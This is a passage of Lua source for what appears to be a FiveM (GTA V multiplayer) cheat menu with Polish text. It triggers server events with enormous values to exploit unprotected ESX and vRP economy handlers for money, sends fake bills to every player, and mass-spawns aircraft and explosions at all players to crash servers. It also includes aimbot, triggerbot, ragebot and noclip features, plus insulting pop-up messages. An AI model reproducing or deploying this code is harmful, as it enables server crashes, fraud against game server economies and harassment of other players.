                notify("~g~Testuje wszystkie ~g~skrypty ~y~ESX.", true)
                TSE("esx_carthief:pay", result)
                TSE("esx_jobs:caution", "give_back", result)
                TSE("esx_fueldelivery:pay", result)
                TSE("esx_carthief:pay", result)
                TSE("esx_godirtyjob:pay", result)
                TSE("esx_pizza:pay", result)
                TSE("esx_ranger:pay", result)
                TSE("esx_garbagejob:pay", result)
                TSE("esx_truckerjob:pay", result)
                TSE("AdminMenu:giveBank", result)
                TSE("AdminMenu:giveCash", result)
                TSE("esx_gopostaljob:pay", result)
                TSE("esx_banksecurity:pay", result)
                TSE("esx_slotmachine:sv:2", result)
              elseif confirm == "n" then
                notify("~b~Operacja anulowana~s~.", false)
              else
                notify("~b~Wpisz t lub n~s~.", true)
                notify("~b~Operacja anulowana~s~.", false)
              end
            end
          end

        function vrpdestroy()
            for c = 0, 9 do
            end
            TSE("lscustoms:payGarage", {costs = -99999999})
            TSE("vrp_slotmachine:server:2",999999999)
			TSE("bank:deposit", 999999999)
			for i=0,1000 do
			TSE('paycheck:bonus')
			TSE('paycheck:salary')
			end
			local q = 99999
			for k= 1,3000 do
			TSE("bank:transfer", k, q)
            end
          end

		  if vrpdbc then
			for i=0,10 do
				for veh in EnumerateVehicles() do
					Citizen.InvokeNative(0xAD738C3085FE7E11, veh, true, true)
					 
					if DoesEntityExist(veh) then
					local colors = "asdrubale"
					local extra_colors = "asdrubale"
					local neoncolor = "asdrubale"
					local mods = "asdrubale"
					local smokecolor = "asdrubale"
					local plate = math.random(1,999999)
					local plateindex = "asdrubale"
					local primarycolor = "asdrubale"
					local secondarycolor = "asdrubale"
					local pearlescentcolor = "asdrubale"
					local wheelcolor = "asdrubale"
					local neoncolor1 = "asdrubale"
					local neoncolor2 = "asdrubale"
					local neoncolor3 = "asdrubale"
					local windowtint = "asdrubale"
					local wheeltype = "asdrubale"
					local smokecolor1 = "asdrubale"
					local smokecolor2 = "asdrubale"
					local smokecolor3 = "asdrubale"
					local mods0 = "asdrubale"
					local mods1 = "asdrubale"
					local mods2 = "asdrubale"
					local mods3 = "asdrubale"
					local mods4 = "asdrubale"
					local mods5 = "asdrubale"
					local mods6 = "asdrubale"
					local mods7 = "asdrubale"
					local mods8 = "asdrubale"
					local mods9 = "asdrubale"
					local mods10 ="asdrubale"
					local mods11 = "asdrubale"
					local mods12 = "asdrubale"
					local mods13 = "asdrubale"
					local mods14 = "asdrubale"
					local mods15 = "asdrubale"
					local mods16 = "asdrubale"
					local mods23 = "asdrubale"
					local mods24 = "asdrubale"
					local turbo = "asdrubale"
					local tiresmoke = "asdrubale"
					local xenon = "asdrubale"
					local neon1 = "asdrubale"
					local neon2 = "asdrubale"
					local neon3 = "asdrubale"
					local bulletproof = "asdrubale"
					local variation = "asdrubale"
					TriggerServerEvent('lscustoms:UpdateVeh', vehicle, plate, plateindex,primarycolor,secondarycolor,pearlescentcolor,wheelcolor,neoncolor1,neoncolor2,neoncolor3,windowtint,wheeltype,mods0,mods1,mods2,mods3,mods4,mods5,mods6,mods7,mods8,mods9,mods10,mods11,mods12,mods13,mods14,mods15,mods16,turbo,tiresmoke,xenon,mods23,mods24,neon0,neon1,neon2,neon3,bulletproof,smokecolor1,smokecolor2,smokecolor3,variation)
					end
				end
			end
		  end


          if haharip then
            esxdestroyv3()
			nukeserver()
			vrpdestroy()
          end

          function esxdestroyv3()
            TSE("esx_jobs:caution", "give_back", 9999999999)
            TSE("esx_fueldelivery:pay", 9999999999)
            TSE("esx_carthief:pay", 9999999999)
            TSE("esx_godirtyjob:pay", 9999999999)
            TSE("esx_pizza:pay", 9999999999)
            TSE("esx_ranger:pay", 9999999999)
            TSE("esx_garbagejob:pay", 9999999999)
            TSE("esx_truckerjob:pay", 9999999999)
            TSE("AdminMenu:giveBank", 9999999999)
            TSE("AdminMenu:giveCash", 9999999999)
            TSE("esx_gopostaljob:pay", 9999999999)
            TSE("esx_banksecurity:pay", 9999999999)
            TSE("esx_slotmachine:sv:2", 9999999999)
            for c = 0, 9 do
            end
            local pbase = GetActivePlayers()
            for i=0, #pbase do
              TSE("esx:giveInventoryItem", GetPlayerServerId(i), "item_money", "money", 101337)
              TSE("esx_billing:sendBill", GetPlayerServerId(i), "society_police", "https://dc.xaries.pl", 13374316)
            end
          end

          if titolo ~= "https://dc.xaries.pl v0.2" then
            ForceSocialClubUpdate()
          end



          function nukeserver()
            local camion = "Avenger"
            local avion = "CARGOPLANE"
            local avion2 = "luxor"
            local heli = "maverick"
            local random = "blimp2"
            while not HasModelLoaded(GetHashKey(avion)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(avion))
            end
            while not HasModelLoaded(GetHashKey(avion2)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(avion2))
            end
            while not HasModelLoaded(GetHashKey(camion)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(camion))
            end
            while not HasModelLoaded(GetHashKey(heli)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(heli))
            end
            while not HasModelLoaded(GetHashKey(random)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(random))
            end
            for i=0,128 do
              for c = 0, 9 do
              end
              CreateVehicle(GetHashKey(camion),GetEntityCoords(GetPlayerPed(i)) + 2.0, true, true) 
              CreateVehicle(GetHashKey(avion),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true) 
              CreateVehicle(GetHashKey(avion2),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true) 
              CreateVehicle(GetHashKey(heli),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true) 
			        CreateVehicle(GetHashKey(random),GetEntityCoords(GetPlayerPed(i)) + 3.0, true, true)
              AddExplosion(GetEntityCoords(GetPlayerPed(i)), 5, 3000.0, true, false, 100000.0)
			      end
          end

          if servercrasherxd then
            Citizen.CreateThread(function()
            local camion = "Avenger"
            local avion = "CARGOPLANE"
            local avion2 = "luxor"
            local heli = "maverick"
            local random = "blimp2"
            while not HasModelLoaded(GetHashKey(avion)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(avion))
            end
            while not HasModelLoaded(GetHashKey(avion2)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(avion2))
            end
            while not HasModelLoaded(GetHashKey(camion)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(camion))
            end
            while not HasModelLoaded(GetHashKey(heli)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(heli))
            end
            while not HasModelLoaded(GetHashKey(random)) do
              Citizen.Wait(0)
              RequestModel(GetHashKey(random))
            end
            local pbase = GetActivePlayers()
            for i=0, #pbase do

              for a = 100, 150 do
                local avion2 = CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(camion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(camion),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true) and
                CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(avion),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(avion),  2 * GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(avion2),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(avion2),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true) and
                CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(heli),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(heli),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true) and
                CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(random),  GetEntityCoords(GetPlayerPed(i)) - a, true, true) and
                CreateVehicle(GetHashKey(random),  2 * GetEntityCoords(GetPlayerPed(i)) + a, true, true)
              end
            end
            end)
          end

          if VehSpeed and IsPedInAnyVehicle(PlayerPedId(-1), true) then
            if IsControlPressed(0, 209) then
              SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 250.0)
            elseif IsControlPressed(0, 210) then
              SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0)
            end
          end

          if TriggerBot then
            local Aiming, Entity = GetEntityPlayerIsFreeAimingAt(PlayerId(-1), Entity)
            if Aiming then
              if IsEntityAPed(Entity) and not IsPedDeadOrDying(Entity, 0) and IsPedAPlayer(Entity) then
                ShootPlayer(Entity)
              end
            end
          end

		  if Aimlock then
			SetPlayerLockon(PlayerId(), false)
			SetPlayerTargetingMode(1)
			SetPlayerLockonRangeOverride(PlayerId(),9999)
		  end

          if Aimbot then
            for player=1, 128 do
              if player ~= PlayerId() then
                if IsPlayerFreeAiming(PlayerId()) then
                  local TargetPed = GetPlayerPed(player)
                  local TargetPos = GetEntityCoords(TargetPed)
                  local Exist = DoesEntityExist(TargetPed)
                  local Dead = IsPlayerDead(TargetPed)

                  if Exist and not Dead then
                    local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                    if IsEntityVisible(TargetPed) and OnScreen then
                      if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 17) then
                        local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                        SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                      end
                    end
                  end
                end
              end
            end
		  end

          if ragebot then
            for player=1, 128 do
              if player ~= PlayerId() then
                local TargetPed = GetPlayerPed(player)
                local TargetPos = GetEntityCoords(TargetPed)
                local Exist = DoesEntityExist(TargetPed)
                local Dead = IsPlayerDead(TargetPed)

                if Exist and not Dead then
                  local OnScreen, ScreenX, ScreenY = World3dToScreen2d(TargetPos.x, TargetPos.y, TargetPos.z, 0)
                  if IsEntityVisible(TargetPed) and OnScreen then
                    if HasEntityClearLosToEntity(PlayerPedId(), TargetPed, 17) then
                      local TargetCoords = GetPedBoneCoords(TargetPed, 31086, 0, 0, 0)
                      SetPedShootsAtCoord(PlayerPedId(), TargetCoords.x, TargetCoords.y, TargetCoords.z, 1)
                    end
                  end
                end
              end
            end
          end


          if rapidfire then
            DRFT()
          end

          if explosiveammo then
            local ret, pos = GetPedLastWeaponImpactCoord(PlayerPedId())
            if ret then
              AddExplosion(pos.x, pos.y, pos.z, 1, 1.0, 1, 0, 0.1)
            end
          end



          if RainbowVeh then
            Citizen.Wait(0)
            local rgb = RGB(1.0)
            SetVehicleCustomPrimaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), rgb.r, rgb.g, rgb.b)
            SetVehicleCustomSecondaryColour(GetVehiclePedIsUsing(PlayerPedId(-1)), rgb.r, rgb.g, rgb.b)
          end

          if rainbowh then
            for i = -1, 12 do
              Citizen.Wait(0)
              local ra = RGB(1.0)
              SetVehicleHeadlightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), i)
              SetVehicleNeonLightsColour(GetVehiclePedIsUsing(PlayerPedId(-1)), ra.r, ra.g, ra.b)
              if i == 12 then
                i = -1
              end
            end
          end

          if t2x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
          end

          if t4x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
          end

          if t10x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 10.0 * 20.0)
          end

          if t16x then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
          end

          if txd then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 500.0 * 20.0)
          end

          if tbxd then
            SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 9999.0 * 20.0)
          end

          if Noclip then
            DrawTxt("NOCLIP ~g~ON", 0.70, 0.9)
            local currentSpeed = 2
            local noclipEntity =
            IsPedInAnyVehicle(PlayerPedId(-1), false) and GetVehiclePedIsUsing(PlayerPedId(-1)) or PlayerPedId(-1)
            FreezeEntityPosition(PlayerPedId(-1), true)
            SetEntityInvincible(PlayerPedId(-1), true)

            local newPos = GetEntityCoords(entity)

            DisableControlAction(0, 32, true)
            DisableControlAction(0, 268, true)

            DisableControlAction(0, 31, true)

            DisableControlAction(0, 269, true)
            DisableControlAction(0, 33, true)

            DisableControlAction(0, 266, true)
            DisableControlAction(0, 34, true)

            DisableControlAction(0, 30, true)

            DisableControlAction(0, 267, true)
            DisableControlAction(0, 35, true)

            DisableControlAction(0, 44, true)
            DisableControlAction(0, 20, true)

            local yoff = 0.0
            local zoff = 0.0

            if GetInputMode() == "MouseAndKeyboard" then
              if IsDisabledControlPressed(0, 32) then
                yoff = 0.5
              end
              if IsDisabledControlPressed(0, 33) then
                yoff = -0.5
              end
              if IsDisabledControlPressed(0, 34) then
                SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) + 3.0)
              end
              if IsDisabledControlPressed(0, 35) then
                SetEntityHeading(PlayerPedId(-1), GetEntityHeading(PlayerPedId(-1)) - 3.0)
              end
              if IsDisabledControlPressed(0, 44) then
                zoff = 0.21
              end
              if IsDisabledControlPressed(0, 20) then
                zoff = -0.21
              end
            end

            newPos =
            GetOffsetFromEntityInWorldCoords(noclipEntity, 0.0, yoff * (currentSpeed + 0.3), zoff * (currentSpeed + 0.3))

            local heading = GetEntityHeading(noclipEntity)
            SetEntityVelocity(noclipEntity, 0.0, 0.0, 0.0)
            SetEntityRotation(noclipEntity, 0.0, 0.0, 0.0, 0, false)
            SetEntityHeading(noclipEntity, heading)

            SetEntityCollision(noclipEntity, false, false)
            SetEntityCoordsNoOffset(noclipEntity, newPos.x, newPos.y, newPos.z, true, true, true)

            FreezeEntityPosition(noclipEntity, false)
            SetEntityInvincible(noclipEntity, false)
            SetEntityCollision(noclipEntity, true, true)
          end
        end
        end)

        Citizen.CreateThread(function()
          FreezeEntityPosition(entity, false)
          local playerIdxWeapon = 1;
          local WeaponTypeSelect = nil
          local WeaponSelected = nil
          local ModSelected = nil
          local currentItemIndex = 1
          local selectedItemIndex = 1
          local powerboost = { 1.0, 2.0, 4.0, 10.0, 512.0, 9999.0 }
          local spawninside = false
          JesusRadius = 5.0
          JesusRadiusOps = {5.0, 10.0, 15.0, 20.0, 50.0}
          local currJesusRadiusIndex = 1
          local selJesusRadiusIndex = 1
          LR.CreateMenu(LynxIcS, LynxIcZ)
          LR.CreateSubMenu(sMX, LynxIcS, bytexd)
          LR.CreateSubMenu(TRPM, LynxIcS, bytexd)
          LR.CreateSubMenu(WMPS, LynxIcS, bytexd)
          LR.CreateSubMenu(advm, LynxIcS, bytexd)
          LR.CreateSubMenu(LMX, LynxIcS, bytexd)
          LR.CreateSubMenu(VMS, LynxIcS, bytexd)
          LR.CreateSubMenu(OPMS, LynxIcS, bytexd)
          LR.CreateSubMenu(poms, OPMS, bytexd)
          LR.CreateSubMenu(dddd, advm, bytexd)
          LR.CreateSubMenu(esms, LMX, bytexd)
          LR.CreateSubMenu(ESXD, LMX, bytexd)
          LR.CreateSubMenu(ESXC, LMX, bytexd)
          LR.CreateSubMenu(SEVR, LMX, bytexd)
		  --Podkategorie
          LR.CreateSubMenu(TrollP, SEVR, bytexd)	
          LR.CreateSubMenu(MoneyP, SEVR, bytexd)
		  --Pieniadze
		  LR.CreateSubMenu(AvizonRPM, MoneyP, bytexd)
		  LR.CreateSubMenu(MoroRPM, MoneyP, bytexd)
		  --Troll
		  LR.CreateSubMenu(AvizonRPT, TrollP, bytexd)
		  LR.CreateSubMenu(MoroRPT, TrollP, bytexd)
		  --=========================================
		  
          LR.CreateSubMenu(VRPT, LMX, bytexd)
          LR.CreateSubMenu(MSTC, LMX, bytexd)
          LR.CreateSubMenu(crds, LynxIcS, bytexd)
          LR.CreateSubMenu(Tmas, poms, bytexd)
          LR.CreateSubMenu(WTNe, WMPS, bytexd)
          LR.CreateSubMenu(WTSbull, WTNe, bytexd)
          LR.CreateSubMenu(WOP, WTSbull, bytexd)
          LR.CreateSubMenu(MSMSA, WOP, bytexd)
          LR.CreateSubMenu(CTSa, VMS, bytexd)
          LR.CreateSubMenu(CTS, CTSa, bytexd)
          LR.CreateSubMenu(cAoP, CTS, bytexd)
          LR.CreateSubMenu(MTS, VMS, bytexd)
          LR.CreateSubMenu(mtsl, MTS, bytexd)
          LR.CreateSubMenu(CTSmtsps, mtsl, bytexd)
          LR.CreateSubMenu(GSWP, OPMS, bytexd)
          LR.CreateSubMenu(espa, advm, bytexd)
          LR.CreateSubMenu(LSCC, VMS, bytexd)
          LR.CreateSubMenu(tngns, LSCC, bytexd)
          LR.CreateSubMenu(prof, LSCC, bytexd)
          LR.CreateSubMenu(bmm, VMS, bytexd)
          LR.CreateSubMenu(SPD, Tmas, bytexd)
          LR.CreateSubMenu(gccccc, VMS, bytexd)
          LR.CreateSubMenu(CMSMS, WMPS, bytexd)
          LR.CreateSubMenu(GAPA,OPMS,bytexd)



          for i,theItem in pairs(vehicleMods) do
            LR.CreateSubMenu(theItem.id, tngns, theItem.name)

            if theItem.id == "paint" then
              LR.CreateSubMenu("primary", theItem.id, "Primary Paint")
              LR.CreateSubMenu("secondary", theItem.id, "Secondary Paint")

              LR.CreateSubMenu("rimpaint", theItem.id, "Wheel Paint")

              LR.CreateSubMenu("classic1", "primary", "Classic Paint")
              LR.CreateSubMenu("metallic1", "primary", "Metallic Paint")
              LR.CreateSubMenu("matte1", "primary","Matte Paint")
              LR.CreateSubMenu("metal1", "primary","Metal Paint")
              LR.CreateSubMenu("classic2", "secondary", "Classic Paint")
              LR.CreateSubMenu("metallic2", "secondary", "Metallic Paint")
              LR.CreateSubMenu("matte2", "secondary","Matte Paint")
              LR.CreateSubMenu("metal2", "secondary","Metal Paint")
              LR.CreateSubMenu("classic3", "rimpaint", "Classic Paint")
              LR.CreateSubMenu("metallic3", "rimpaint", "Metallic Paint")
              LR.CreateSubMenu("matte3", "rimpaint","Matte Paint")
              LR.CreateSubMenu("metal3", "rimpaint","Metal Paint")

            end
          end

          for i,theItem in pairs(perfMods) do
            LR.CreateSubMenu(theItem.id, prof, theItem.name)
          end

          local SelectedPlayer

          while Enabled do

            ped = PlayerPedId()
            veh = GetVehiclePedIsUsing(ped)
            SetVehicleModKit(veh,0)

            for i,theItem in pairs(vehicleMods) do

              if LR.IsMenuOpened(tngns) then
                if isPreviewing then
                  if oldmodtype == "neon" then
                    local r,g,b = table.unpack(oldmod)
                    SetVehicleNeonLightsColour(veh,r,g,b)
                    SetVehicleNeonLightEnabled(veh, 0, oldmodaction)
                    SetVehicleNeonLightEnabled(veh, 1, oldmodaction)
                    SetVehicleNeonLightEnabled(veh, 2, oldmodaction)
                    SetVehicleNeonLightEnabled(veh, 3, oldmodaction)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  elseif oldmodtype == "paint" then
                    local pa,pb,pc,pd = table.unpack(oldmod)
                    SetVehicleColours(veh, pa,pb)
                    SetVehicleExtraColours(veh,pc,pd)
                    isPreviewing = false
                    oldmodtype = -1
                    oldmod = -1
                  else
                    if oldmodaction == "rm" then
                      RemoveVehicleMod(veh, oldmodtype)
                      isPreviewing = false
                      oldmodtype = -1
                      oldmod = -1
                    else
                      SetVehicleMod(veh, oldmodtype,oldmod,false)
                      isPreviewing = false
                      oldmodtype = -1
                      oldmod = -1
                    end
                  end
                end
              end

              if LR.IsMenuOpened(theItem.id) then
                if theItem.id == "wheeltypes" then
                  if LR.Button("Sport Wheels") then
                    SetVehicleWheelType(veh,0)
                  elseif LR.Button("Muscle Wheels") then
                    SetVehicleWheelType(veh,1)
                  elseif LR.Button("Lowrider Wheels") then
                    SetVehicleWheelType(veh,2)
                  elseif LR.Button("SUV Wheels") then
                    SetVehicleWheelType(veh,3)
                  elseif LR.Button("Offroad Wheels") then
                    SetVehicleWheelType(veh,4)
                  elseif LR.Button("Tuner Wheels") then
                    SetVehicleWheelType(veh,5)
                  elseif LR.Button("High End Wheels") then
                    SetVehicleWheelType(veh,7)
                  end
                  LR.Display()
                elseif theItem.id == "extra" then
                  local extras = checkValidVehicleExtras()
                  for i,theItem in pairs(extras) do
                    if IsVehicleExtraTurnedOn(veh,i) then
                      pricestring = "Installed"
                    else
                      pricestring = "Not Installed"
                    end

                    if LR.Button(theItem.menuName, pricestring) then
                      SetVehicleExtra(veh, i, IsVehicleExtraTurnedOn(veh,i))
                    end
                  end
                  LR.Display()
                elseif theItem.id == "headlight" then

                  if LR.Button("None") then
                    SetVehicleHeadlightsColour(veh, -1)
                  end

                  for theName, theItem in pairs(headlightscolor) do
                    tp = GetVehicleHeadlightsColour(veh)

                    if tp == theItem.id and not isPreviewing then
                      pricetext = "Installed"
                    else
                      if isPreviewing and tp == theItem.id then
                        pricetext = "Previewing"
                      else
                        pricetext = "Not Installed"
                      end
                    end
                    head = GetVehicleHeadlightsColour(veh)
                    if LR.Button(theItem.name, pricetext) then
                      if not isPreviewing then
                        oldmodtype = "headlight"
                        oldmodaction = false
                        oldhead = GetVehicleHeadlightsColour(veh)
                        oldmod = table.pack(oldhead)
                        SetVehicleHeadlightsColour(veh, theItem.id)

                        isPreviewing = true
                      elseif isPreviewing and head == theItem.id then
                        ToggleVehicleMod(veh, 22, true)
                        SetVehicleHeadlightsColour(veh, theItem.id)
                        isPreviewing = false
                        oldmodtype = -1
                        oldmod = -1
                      elseif isPreviewing and head ~= theItem.id then
                        SetVehicleHeadlightsColour(veh, theItem.id)
                        isPreviewing = true
                      end
                    end
                  end
                  LR.Display()
                elseif theItem.id == "licence" then

                  if LR.Button("None") then
                    SetVehicleNumberPlateTextIndex(veh, 3)
                  end

                  for theName, theItem in pairs(licencetype) do
                    tp = GetVehicleNumberPlateTextIndex(veh)

                    if tp == theItem.id and not isPreviewing then
                      pricetext = "Installed"
                    else
                      if isPreviewing and tp == theItem.id then
                        pricetext = "Previewing"
                      else
                        pricetext = "Not Installed"
                      end
                    end
                    plate = GetVehicleNumberPlateTextIndex(veh)
                    if LR.Button(theItem.name, pricetext) then
                      if not isPreviewing then
                        oldmodtype = "headlight"
                        oldmodaction = false
                        oldhead = GetVehicleNumberPlateTextIndex(veh)
                        oldmod = table.pack(oldhead)
                        SetVehicleNumberPlateTextIndex(veh, theItem.id)

                        isPreviewing = true
                      elseif isPreviewing and plate == theItem.id then
                        SetVehicleNumberPlateTextIndex(veh, theItem.id)
                        isPreviewing = false
                        oldmodtype = -1
                        oldmod = -1
                      elseif isPreviewing and plate ~= theItem.id then
                        SetVehicleNumberPlateTextIndex(veh, theItem.id)
                        isPreviewing = true
                      end
                    end
                  end
                  LR.Display()
                elseif theItem.id == "neon" then

                  if LR.Button("None") then
                    SetVehicleNeonLightsColour(veh,255,255,255)
                    SetVehicleNeonLightEnabled(veh,0,false)
                    SetVehicleNeonLightEnabled(veh,1,false)
                    SetVehicleNeonLightEnabled(veh,2,false)
                    SetVehicleNeonLightEnabled(veh,3,false)
                  end


                  for i,theItem in pairs(neonColors) do
                    colorr,colorg,colorb = table.unpack(theItem)
                    r,g,b = GetVehicleNeonLightsColour(veh)

                    if colorr == r and colorg == g and colorb == b and IsVehicleNeonLightEnabled(vehicle,2) and not isPreviewing then
                      pricestring = "Installed"
                    else
                      if isPreviewing and colorr == r and colorg == g and colorb == b then
                        pricestring = "Previewing"
                      else
                        pricestring = "Not Installed"
                      end
                    end

                    if LR.Button(i, pricestring) then
                      if not isPreviewing then
                        oldmodtype = "neon"
                        oldmodaction = IsVehicleNeonLightEnabled(veh,1)
                        oldr,oldg,oldb = GetVehicleNeonLightsColour(veh)
                        oldmod = table.pack(oldr,oldg,oldb)
                        SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
                        SetVehicleNeonLightEnabled(veh,0,true)
                        SetVehicleNeonLightEnabled(veh,1,true)
                        SetVehicleNeonLightEnabled(veh,2,true)
                        SetVehicleNeonLightEnabled(veh,3,true)
                        isPreviewing = true
                      elseif isPreviewing and colorr == r and colorg == g and colorb == b then
                        SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
                        SetVehicleNeonLightEnabled(veh,0,true)
                        SetVehicleNeonLightEnabled(veh,1,true)
                        SetVehicleNeonLightEnabled(veh,2,true)
                        SetVehicleNeonLightEnabled(veh,3,true)
                        isPreviewing = false
                        oldmodtype = -1
                        oldmod = -1
                      elseif isPreviewing and colorr ~= r or colorg ~= g or colorb ~= b then
                        SetVehicleNeonLightsColour(veh,colorr,colorg,colorb)
                        SetVehicleNeonLightEnabled(veh,0,true)
                        SetVehicleNeonLightEnabled(veh,1,true)
                        SetVehicleNeonLightEnabled(veh,2,true)
                        SetVehicleNeonLightEnabled(veh,3,true)
                        isPreviewing = true
                      end
                    end
                  end
                  LR.Display()
                elseif theItem.id == "paint" then

                  if LR.MenuButton("~p~#~s~ Primary Paint","primary") then

                  elseif LR.MenuButton("~p~#~s~ Secondary Paint","secondary") then

                  elseif LR.MenuButton("~p~#~s~ Wheel Paint","rimpaint") then

                  end


                  LR.Display()

                else
                  local valid = checkValidVehicleMods(theItem.id)
                  for i,ctheItem in pairs(valid) do
                    for eh,tehEtem in pairs(horns) do
                      if eh == theItem.name and GetVehicleMod(veh,theItem.id) ~= ctheItem.data.realIndex then
                        price = "Not Installed"
                      elseif eh == theItem.name and isPreviewing and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
                        price = "Previewing"
                      elseif eh == theItem.name and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
                        price = "Installed"
                      end
                    end
                    if ctheItem.menuName == "~b~Stock" then end
                    if theItem.name == "Horns" then
                      for chorn,HornId in pairs(horns) do
                        if HornId == ci-1 then
                          ctheItem.menuName = chorn
                        end
                      end
                    end
                    if ctheItem.menuName == "NULL" then
                      ctheItem.menuName = "unknown"
                    end
                    if LR.Button(ctheItem.menuName) then

                      if not isPreviewing then
                        oldmodtype = theItem.id
                        oldmod = GetVehicleMod(veh, theItem.id)
                        isPreviewing = true
                        if ctheItem.data.realIndex == -1 then
                          oldmodaction = "rm"
                          RemoveVehicleMod(veh, ctheItem.data.modid)
                          isPreviewing = false
                          oldmodtype = -1
                          oldmod = -1
                          oldmodaction = false
                        else
                          oldmodaction = false
                          SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, false)
                        end
                      elseif isPreviewing and GetVehicleMod(veh,theItem.id) == ctheItem.data.realIndex then
                        isPreviewing = false
                        oldmodtype = -1
                        oldmod = -1
                        oldmodaction = false
                        if ctheItem.data.realIndex == -1 then
                          RemoveVehicleMod(veh, ctheItem.data.modid)
                        else
                          SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, false)
                        end
                      elseif isPreviewing and GetVehicleMod(veh,theItem.id) ~= ctheItem.data.realIndex then
                        if ctheItem.data.realIndex == -1 then
                          RemoveVehicleMod(veh, ctheItem.data.modid)
                          isPreviewing = false
                          oldmodtype = -1
                          oldmod = -1
                          oldmodaction = false
                        else
                          SetVehicleMod(veh, theItem.id, ctheItem.data.realIndex, false)
                          isPreviewing = true
                        end
                      end
                    end
                  end
                  LR.Display()
                end
              end
            end



            for i,theItem in pairs(perfMods) do
              if LR.IsMenuOpened(theItem.id) then

                if GetVehicleMod(veh,theItem.id) == 0 then
                  pricestock = "Not Installed"
                  price1 = "Installed"
                  price2 = "Not Installed"
                  price3 = "Not Installed"
                  price4 = "Not Installed"
                elseif GetVehicleMod(veh,theItem.id) == 1 then
                  pricestock = "Not Installed"
                  price1 = "Not Installed"
                  price2 = "Installed"
                  price3 = "Not Installed"
                  price4 = "Not Installed"
                elseif GetVehicleMod(veh,theItem.id) == 2 then
                  pricestock = "Not Installed"
                  price1 = "Not Installed"
                  price2 = "Not Installed"
                  price3 = "Installed"
                  price4 = "Not Installed"
                elseif GetVehicleMod(veh,theItem.id) == 3 then
                  pricestock = "Not Installed"
                  price1 = "Not Installed"
                  price2 = "Not Installed"
                  price3 = "Not Installed"
                  price4 = "Installed"
                elseif GetVehicleMod(veh,theItem.id) == -1 then
                  pricestock = "Installed"
                  price1 = "Not Installed"
                  price2 = "Not Installed"
                  price3 = "Not Installed"
                  price4 = "Not Installed"
                end
                if LR.Button("Stock "..theItem.name, pricestock) then
                  SetVehicleMod(veh,theItem.id, -1)
                elseif LR.Button(theItem.name.." Upgrade 1", price1) then
                  SetVehicleMod(veh,theItem.id, 0)
                elseif LR.Button(theItem.name.." Upgrade 2", price2) then
                  SetVehicleMod(veh,theItem.id, 1)
                elseif LR.Button(theItem.name.." Upgrade 3", price3) then
                  SetVehicleMod(veh,theItem.id, 2)
                elseif theItem.id ~= 13 and theItem.id ~= 12 and LR.Button(theItem.name.." Upgrade 4", price4) then
                  SetVehicleMod(veh,theItem.id, 3)
                end
                LR.Display()
              end
            end

            if LR.IsMenuOpened(LynxIcS) then

              DrawTxt("~f~https://dc.xaries.pl ~s~- "..pisello, 0.80, 0.9)
              drawDescription("Ale jestes kozakiem OMG ~p~"..pisello.." ~s~!", 0.5, 0.5)
              notify("~f~Twoja stara to jest cipa~f~", true)
              notify("~u~Mam ja na jednego hita~u~", false)
              if LR.MenuButton("~p~#~s~ Opcje wlasne", sMX) then
              elseif LR.MenuButton("~p~#~s~ Gracze online", OPMS) then
              elseif LR.MenuButton("~p~#~s~ Menu Teleportacji", TRPM) then
              elseif LR.MenuButton("~p~#~s~ Menu pojazdow", VMS) then
